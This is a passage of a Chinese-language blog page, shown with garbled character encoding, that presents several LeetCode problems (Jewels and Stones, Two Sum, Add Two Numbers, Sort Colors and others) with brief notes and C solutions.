id="1-LCP-19-ç§‹å¶æ”¶è—é›†ï¼ˆä¸­ç­‰ï¼‰"><a href="#1-LCP-19-ç§‹å¶æ”¶è—é›†ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="1 - LCP 19. ç§‹å¶æ”¶è—é›†ï¼ˆä¸­ç­‰ï¼‰"></a>1 - <a href="https://leetcode-cn.com/problems/UlBDOe/">LCP 19. ç§‹å¶æ”¶è—é›†ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>å°æ‰£å‡ºå»ç§‹æ¸¸ï¼Œé€”ä¸­æ”¶é›†äº†ä¸€äº›çº¢å¶å’Œé»„å¶ï¼Œä»–åˆ©ç”¨è¿™äº›å¶å­åˆæ­¥æ•´ç†äº†ä¸€ä»½ç§‹å¶æ”¶è—é›† leavesï¼Œ å­—ç¬¦ä¸² leaves ä»…åŒ…å«å°å†™å­—ç¬¦ r å’Œ yï¼Œ å…¶ä¸­å­—ç¬¦ r è¡¨ç¤ºä¸€ç‰‡çº¢å¶ï¼Œå­—ç¬¦ y è¡¨ç¤ºä¸€ç‰‡é»„å¶ã€‚<br>å‡ºäºç¾è§‚æ•´é½çš„è€ƒè™‘ï¼Œå°æ‰£æƒ³è¦å°†æ”¶è—é›†ä¸­æ ‘å¶çš„æ’åˆ—è°ƒæ•´æˆã€Œçº¢ã€é»„ã€çº¢ã€ä¸‰éƒ¨åˆ†ã€‚æ¯éƒ¨åˆ†æ ‘å¶æ•°é‡å¯ä»¥ä¸ç›¸ç­‰ï¼Œä½†å‡éœ€å¤§äºç­‰äº 1ã€‚æ¯æ¬¡è°ƒæ•´æ“ä½œï¼Œå°æ‰£å¯ä»¥å°†ä¸€ç‰‡çº¢å¶æ›¿æ¢æˆé»„å¶æˆ–è€…å°†ä¸€ç‰‡é»„å¶æ›¿æ¢æˆçº¢å¶ã€‚è¯·é—®å°æ‰£æœ€å°‘éœ€è¦å¤šå°‘æ¬¡è°ƒæ•´æ“ä½œæ‰èƒ½å°†ç§‹å¶æ”¶è—é›†è°ƒæ•´å®Œæ¯•ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p>è¾“å…¥ï¼šleaves &#x3D; â€œrrryyyrryyyrrâ€</p><p>è¾“å‡ºï¼š2</p><p>è§£é‡Šï¼šè°ƒæ•´ä¸¤æ¬¡ï¼Œå°†ä¸­é—´çš„ä¸¤ç‰‡çº¢å¶æ›¿æ¢æˆé»„å¶ï¼Œå¾—åˆ° â€œrrryyyyyyyyrrâ€</p><p>ç¤ºä¾‹ 2ï¼š</p><p>è¾“å…¥ï¼šleaves &#x3D; â€œryrâ€</p><p>è¾“å‡ºï¼š0</p><p>è§£é‡Šï¼šå·²ç¬¦åˆè¦æ±‚ï¼Œä¸éœ€è¦é¢å¤–æ“ä½œ</p><p>æç¤ºï¼š</p><p>3 &lt;&#x3D; leaves.length &lt;&#x3D; 10^5<br>leaves ä¸­åªåŒ…å«å­—ç¬¦ â€˜râ€™ å’Œå­—ç¬¦ â€˜yâ€™</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/UlBDOe">https://leetcode-cn.com/problems/UlBDOe</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>æœ€è¿‘å¿™ç€è‡ªé—­ï¼ˆxï¼‰</p><p>è§£æ³•åŠ¨æ€è§„åˆ’ï¼Œé¢˜è§£æœ‰æ—¶é—´å†å›æ¥å†™ï¼ˆå’•å’•å’•</p><p><img src="https://i.loli.net/2020/10/02/HrSx812GPa97JtT.png" alt="image.png"></p><h3 id="2-771-å®çŸ³ä¸çŸ³å¤´ï¼ˆç®€å•ï¼‰"><a href="#2-771-å®çŸ³ä¸çŸ³å¤´ï¼ˆç®€å•ï¼‰" class="headerlink" title="2 - 771. å®çŸ³ä¸çŸ³å¤´ï¼ˆç®€å•ï¼‰"></a>2 - <a href="https://leetcode-cn.com/problems/jewels-and-stones/">771. å®çŸ³ä¸çŸ³å¤´ï¼ˆç®€å•ï¼‰</a></h3><blockquote><p> ç»™å®šå­—ç¬¦ä¸²J ä»£è¡¨çŸ³å¤´ä¸­å®çŸ³çš„ç±»å‹ï¼Œå’Œå­—ç¬¦ä¸² Sä»£è¡¨ä½ æ‹¥æœ‰çš„çŸ³å¤´ã€‚ S ä¸­æ¯ä¸ªå­—ç¬¦ä»£è¡¨äº†ä¸€ç§ä½ æ‹¥æœ‰çš„çŸ³å¤´çš„ç±»å‹ï¼Œä½ æƒ³çŸ¥é“ä½ æ‹¥æœ‰çš„çŸ³å¤´ä¸­æœ‰å¤šå°‘æ˜¯å®çŸ³ã€‚</p><p>J ä¸­çš„å­—æ¯ä¸é‡å¤ï¼ŒJ å’Œ Sä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½æ˜¯å­—æ¯ã€‚å­—æ¯åŒºåˆ†å¤§å°å†™ï¼Œå› æ­¤â€aâ€å’Œâ€Aâ€æ˜¯ä¸åŒç±»å‹çš„çŸ³å¤´ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: J &#x3D; â€œaAâ€, S &#x3D; â€œaAAbbbbâ€<br>è¾“å‡º: 3<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: J &#x3D; â€œzâ€, S &#x3D; â€œZZâ€<br>è¾“å‡º: 0<br>æ³¨æ„:</p><p>S å’Œ J æœ€å¤šå«æœ‰50ä¸ªå­—æ¯ã€‚<br> J ä¸­çš„å­—ç¬¦ä¸é‡å¤ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/jewels-and-stones">https://leetcode-cn.com/problems/jewels-and-stones</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>ç”¨ä¸€ä¸ªæ•°ç»„æ¥ä¿å­˜æœ‰çš„å®çŸ³å†éå†çŸ³å¤´å³å¯</p><p>å› ä¸ºæ˜¯å­—ç¬¦å‹ï¼Œæ–¹ä¾¿èµ·è§å¯ä»¥ç›´æ¥ç”¨ä¸€ä¸ª128å¤§å°çš„æ•°ç»„æ¥å‚¨å­˜ä¿¡æ¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">numJewelsInStones</span><span class="params">(<span class="type">char</span> * J, <span class="type">char</span> * S)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> <span class="built_in">map</span>[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(*J)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="built_in">map</span>[*J]))</span><br><span class="line">            <span class="built_in">map</span>[*J] = <span class="number">1</span>;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(*S)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="built_in">map</span>[*S]))</span><br><span class="line">            num++;</span><br><span class="line">        S++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![KE97BAWWD__F&#96;_X6X__&#96;&#96;79.png](<a href="https://i.loli.net/2020/10/03/fGq8SYicjhrBIeN.png">https://i.loli.net/2020/10/03/fGq8SYicjhrBIeN.png</a>)</p><h3 id="3-1-ä¸¤æ•°ä¹‹å’Œï¼ˆç®€å•ï¼‰"><a href="#3-1-ä¸¤æ•°ä¹‹å’Œï¼ˆç®€å•ï¼‰" class="headerlink" title="3 - 1. ä¸¤æ•°ä¹‹å’Œï¼ˆç®€å•ï¼‰"></a>3 - <a href="https://leetcode-cn.com/problems/two-sum/">1. ä¸¤æ•°ä¹‹å’Œï¼ˆç®€å•ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œè¯·ä½ åœ¨è¯¥æ•°ç»„ä¸­æ‰¾å‡ºå’Œä¸ºç›®æ ‡å€¼çš„é‚£ ä¸¤ä¸ª æ•´æ•°ï¼Œå¹¶è¿”å›ä»–ä»¬çš„æ•°ç»„ä¸‹æ ‡ã€‚</p><p>ä½ å¯ä»¥å‡è®¾æ¯ç§è¾“å…¥åªä¼šå¯¹åº”ä¸€ä¸ªç­”æ¡ˆã€‚ä½†æ˜¯ï¼Œæ•°ç»„ä¸­åŒä¸€ä¸ªå…ƒç´ ä¸èƒ½ä½¿ç”¨ä¸¤éã€‚</p><p>ç¤ºä¾‹:</p><p>ç»™å®š nums &#x3D; [2, 7, 11, 15], target &#x3D; 9</p><p>å› ä¸º nums[0] + nums[1] &#x3D; 2 + 7 &#x3D; 9<br>æ‰€ä»¥è¿”å› [0, 1]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/two-sum">https://leetcode-cn.com/problems/two-sum</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p><del>ä¸å¿˜åˆå¿ƒç‰¢è®°ä½¿å‘½</del></p><p>æ˜¯Leetcodeçš„ç¬¬ä¸€é¢˜å‘¢</p><p><strong>æš´åŠ›æšä¸¾</strong>å³å¯</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">twoSum</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> * retn = (<span class="type">int</span>*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;numsSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;numsSize;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] + nums[j] == target)</span><br><span class="line">            &#123;</span><br><span class="line">                retn[<span class="number">0</span>] = i;</span><br><span class="line">                retn[<span class="number">1</span>] = j;</span><br><span class="line">                <span class="keyword">return</span> retn;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>![R&#96;X_RZK1I6_HG7_PV81~RNB.png](<a href="https://i.loli.net/2020/10/03/f8VGlqdrtjUIRsO.png">https://i.loli.net/2020/10/03/f8VGlqdrtjUIRsO.png</a>)</p><h3 id="4-2-ä¸¤æ•°ç›¸åŠ ï¼ˆä¸­ç­‰ï¼‰"><a href="#4-2-ä¸¤æ•°ç›¸åŠ ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="4 - 2. ä¸¤æ•°ç›¸åŠ ï¼ˆä¸­ç­‰ï¼‰"></a>4 - <a href="https://leetcode-cn.com/problems/add-two-numbers/">2. ä¸¤æ•°ç›¸åŠ ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å‡ºä¸¤ä¸ª éç©º çš„é“¾è¡¨ç”¨æ¥è¡¨ç¤ºä¸¤ä¸ªéè´Ÿçš„æ•´æ•°ã€‚å…¶ä¸­ï¼Œå®ƒä»¬å„è‡ªçš„ä½æ•°æ˜¯æŒ‰ç…§ é€†åº çš„æ–¹å¼å­˜å‚¨çš„ï¼Œå¹¶ä¸”å®ƒä»¬çš„æ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ ä¸€ä½ æ•°å­—ã€‚</p><p>å¦‚æœï¼Œæˆ‘ä»¬å°†è¿™ä¸¤ä¸ªæ•°ç›¸åŠ èµ·æ¥ï¼Œåˆ™ä¼šè¿”å›ä¸€ä¸ªæ–°çš„é“¾è¡¨æ¥è¡¨ç¤ºå®ƒä»¬çš„å’Œã€‚</p><p>æ‚¨å¯ä»¥å‡è®¾é™¤äº†æ•°å­— 0 ä¹‹å¤–ï¼Œè¿™ä¸¤ä¸ªæ•°éƒ½ä¸ä¼šä»¥ 0 å¼€å¤´ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>è¾“å…¥ï¼š(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>è¾“å‡ºï¼š7 -&gt; 0 -&gt; 8<br>åŸå› ï¼š342 + 465 &#x3D; 807</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/add-two-numbers">https://leetcode-cn.com/problems/add-two-numbers</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å‘ï¼Œæ¢¦å¼€å§‹çš„åœ°æ–¹å‘¢ã€‚</p><h4 id="è§£æ³•ï¼šæ¨¡æ‹Ÿæ³•"><a href="#è§£æ³•ï¼šæ¨¡æ‹Ÿæ³•" class="headerlink" title="è§£æ³•ï¼šæ¨¡æ‹Ÿæ³•"></a>è§£æ³•ï¼šæ¨¡æ‹Ÿæ³•</h4><p>æ¨¡æ‹Ÿå¸¸è§„çš„åŠ æ³•è¿‡ç¨‹å³å¯</p><p>éœ€è¦æ³¨æ„çš„æ˜¯åŸç»“ç‚¹çš„ç©ºé—´æ˜¯å¯è¢«å¤ç”¨çš„</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-5"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-5" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>éœ€è¦éå†max(m,n)ä¸ªç»“ç‚¹ï¼ˆå…¶ä¸­mä¸ºl1é•¿åº¦ï¼Œnä¸ºl2é•¿åº¦ï¼‰ï¼Œæ•…æ—¶é—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>MAX</strong>(<strong>M,N</strong>))</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š-5"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š-5" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>åªéœ€è¦ä¸´æ—¶å˜é‡çš„å¸¸æ•°ç©ºé—´ï¼Œæ•…ç©ºé—´å¤æ‚åº¦ä¸º<strong>O</strong>(<strong>1</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">addTwoNumbers</span><span class="params">(<span class="keyword">struct</span> ListNode* l1, <span class="keyword">struct</span> ListNode* l2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!l1)</span><br><span class="line">        <span class="keyword">return</span> l2;</span><br><span class="line">    <span class="keyword">if</span>(!l2)</span><br><span class="line">        <span class="keyword">return</span> l1; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">tail</span>, *<span class="title">retn</span> =</span> l1;</span><br><span class="line">    <span class="type">int</span> plus = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(l1 &amp;&amp; l2)</span><br><span class="line">    &#123;</span><br><span class="line">        l1-&gt;val += l2-&gt;val + plus;</span><br><span class="line">        plus = l1-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l1-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(l1)</span><br><span class="line">    &#123;</span><br><span class="line">        l1-&gt;val += plus;</span><br><span class="line">        plus = l1-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l1-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l1;</span><br><span class="line">        l1 = l1-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(l2)</span><br><span class="line">        tail-&gt;next = l2;</span><br><span class="line">    <span class="keyword">while</span>(l2)</span><br><span class="line">    &#123;</span><br><span class="line">        l2-&gt;val += plus;</span><br><span class="line">        plus = l2-&gt;val / <span class="number">10</span>;</span><br><span class="line">        l2-&gt;val %= <span class="number">10</span>;</span><br><span class="line">        tail = l2;</span><br><span class="line">        l2 = l2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(plus)</span><br><span class="line">    &#123;</span><br><span class="line">        tail-&gt;next = (<span class="keyword">struct</span> ListNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ListNode));</span><br><span class="line">        tail-&gt;next-&gt;val = plus;</span><br><span class="line">        tail-&gt;next-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/04/uSQzNqR4AcZYTtX.png" alt="image.png"></p><h3 id="5-18-å››æ•°ä¹‹å’Œï¼ˆä¸­ç­‰ï¼‰"><a href="#5-18-å››æ•°ä¹‹å’Œï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="5 - 18. å››æ•°ä¹‹å’Œï¼ˆä¸­ç­‰ï¼‰"></a>5 - <a href="https://leetcode-cn.com/problems/4sum/">18. å››æ•°ä¹‹å’Œï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªåŒ…å« n ä¸ªæ•´æ•°çš„æ•°ç»„ nums å’Œä¸€ä¸ªç›®æ ‡å€¼ targetï¼Œåˆ¤æ–­ nums ä¸­æ˜¯å¦å­˜åœ¨å››ä¸ªå…ƒç´  aï¼Œbï¼Œc å’Œ d ï¼Œä½¿å¾— a + b + c + d çš„å€¼ä¸ target ç›¸ç­‰ï¼Ÿæ‰¾å‡ºæ‰€æœ‰æ»¡è¶³æ¡ä»¶ä¸”ä¸é‡å¤çš„å››å…ƒç»„ã€‚</p><p>æ³¨æ„ï¼š</p><p>ç­”æ¡ˆä¸­ä¸å¯ä»¥åŒ…å«é‡å¤çš„å››å…ƒç»„ã€‚</p><p>ç¤ºä¾‹ï¼š</p><p>ç»™å®šæ•°ç»„ nums &#x3D; [1, 0, -1, 0, -2, 2]ï¼Œå’Œ target &#x3D; 0ã€‚</p><p>æ»¡è¶³è¦æ±‚çš„å››å…ƒç»„é›†åˆä¸ºï¼š<br>[<br>  [-1,  0, 0, 1],<br>  [-2, -1, 1, 2],<br>  [-2,  0, 0, 2]<br>]</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/4sum">https://leetcode-cn.com/problems/4sum</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>åŒæŒ‡é’ˆå“ˆå¸Œï¼Œç•™å‘¨æœ«å†å†™è§£æ³•äº†</p><h3 id="6-834-æ ‘ä¸­è·ç¦»ä¹‹å’Œï¼ˆå›°éš¾ï¼‰"><a href="#6-834-æ ‘ä¸­è·ç¦»ä¹‹å’Œï¼ˆå›°éš¾ï¼‰" class="headerlink" title="6 - 834. æ ‘ä¸­è·ç¦»ä¹‹å’Œï¼ˆå›°éš¾ï¼‰"></a>6 - <a href="https://leetcode-cn.com/problems/sum-of-distances-in-tree/">834. æ ‘ä¸­è·ç¦»ä¹‹å’Œï¼ˆå›°éš¾ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªæ— å‘ã€è¿é€šçš„æ ‘ã€‚æ ‘ä¸­æœ‰ N ä¸ªæ ‡è®°ä¸º 0â€¦N-1 çš„èŠ‚ç‚¹ä»¥åŠ N-1 æ¡è¾¹ ã€‚</p><p>ç¬¬ i æ¡è¾¹è¿æ¥èŠ‚ç‚¹ edges[i][0] å’Œ edges[i][1] ã€‚</p><p>è¿”å›ä¸€ä¸ªè¡¨ç¤ºèŠ‚ç‚¹ i ä¸å…¶ä»–æ‰€æœ‰èŠ‚ç‚¹è·ç¦»ä¹‹å’Œçš„åˆ—è¡¨ ansã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: N &#x3D; 6, edges &#x3D; [[0,1],[0,2],[2,3],[2,4],[2,5]]<br>è¾“å‡º: [8,12,6,10,10,10]<br>è§£é‡Š:<br>å¦‚ä¸‹ä¸ºç»™å®šçš„æ ‘çš„ç¤ºæ„å›¾ï¼š<br>  0<br> &#x2F; <br>1   2<br>   &#x2F;|<br>  3 4 5</p><p>æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º dist(0,1) + dist(0,2) + dist(0,3) + dist(0,4) + dist(0,5)<br>ä¹Ÿå°±æ˜¯ 1 + 1 + 2 + 2 + 2 &#x3D; 8ã€‚ å› æ­¤ï¼Œanswer[0] &#x3D; 8ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br>è¯´æ˜: 1 &lt;&#x3D; N &lt;&#x3D; 10000</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/sum-of-distances-in-tree">https://leetcode-cn.com/problems/sum-of-distances-in-tree</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>åŠ¨æ€è§„åˆ’ï¼Œå‘¨æœ«å†™è§£æ³•ï¼Œæœ€è¿‘å¿™çš„å¾ˆ</p><h3 id="7-75-é¢œè‰²åˆ†ç±»ï¼ˆä¸­ç­‰ï¼‰"><a href="#7-75-é¢œè‰²åˆ†ç±»ï¼ˆä¸­ç­‰ï¼‰" class="headerlink" title="7 - 75. é¢œè‰²åˆ†ç±»ï¼ˆä¸­ç­‰ï¼‰"></a>7 - <a href="https://leetcode-cn.com/problems/sort-colors/">75. é¢œè‰²åˆ†ç±»ï¼ˆä¸­ç­‰ï¼‰</a></h3><blockquote><p>ç»™å®šä¸€ä¸ªåŒ…å«çº¢è‰²ã€ç™½è‰²å’Œè“è‰²ï¼Œä¸€å…± n ä¸ªå…ƒç´ çš„æ•°ç»„ï¼ŒåŸåœ°å¯¹å®ƒä»¬è¿›è¡Œæ’åºï¼Œä½¿å¾—ç›¸åŒé¢œè‰²çš„å…ƒç´ ç›¸é‚»ï¼Œå¹¶æŒ‰ç…§çº¢è‰²ã€ç™½è‰²ã€è“è‰²é¡ºåºæ’åˆ—ã€‚</p><p>æ­¤é¢˜ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨æ•´æ•° 0ã€ 1 å’Œ 2 åˆ†åˆ«è¡¨ç¤ºçº¢è‰²ã€ç™½è‰²å’Œè“è‰²ã€‚</p><p>æ³¨æ„:<br>ä¸èƒ½ä½¿ç”¨ä»£ç åº“ä¸­çš„æ’åºå‡½æ•°æ¥è§£å†³è¿™é“é¢˜ã€‚</p><p>ç¤ºä¾‹:</p><p>è¾“å…¥: [2,0,2,1,1,0]<br>è¾“å‡º: [0,0,1,1,2,2]<br>è¿›é˜¶ï¼š</p><p>ä¸€ä¸ªç›´è§‚çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨è®¡æ•°æ’åºçš„ä¸¤è¶Ÿæ‰«æç®—æ³•ã€‚<br>é¦–å…ˆï¼Œè¿­ä»£è®¡ç®—å‡º0ã€1 å’Œ 2 å…ƒç´ çš„ä¸ªæ•°ï¼Œç„¶åæŒ‰ç…§0ã€1ã€2çš„æ’åºï¼Œé‡å†™å½“å‰æ•°ç»„ã€‚<br>ä½ èƒ½æƒ³å‡ºä¸€ä¸ªä»…ä½¿ç”¨å¸¸æ•°ç©ºé—´çš„ä¸€è¶Ÿæ‰«æç®—æ³•å—ï¼Ÿ</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/sort-colors">https://leetcode-cn.com/problems/sort-colors</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>å› ä¸ºåªéœ€è¦æ’åºä¸‰ç§é¢œè‰²ï¼Œæ•…è€ƒè™‘å°†æ•°ç»„åˆ†æˆä¸‰å—ï¼Œä¸¤è¶Ÿéå†ï¼Œç¬¬ä¸€è¶ŸæŠŠæ‰€æœ‰çš„0æ”¾åœ¨å‰é¢ï¼Œç¬¬äºŒè¶ŸæŠŠæ‰€æœ‰çš„1æ”¾åœ¨ä¸­é—´å³å¯ï¼Œåœ¨äº¤æ¢çš„è¿‡ç¨‹ä¸­2è‡ªç„¶ä¼šå…¨éƒ¨å †åˆ°æœ«å°¾</p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š-6"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š-6" class="headerlink" 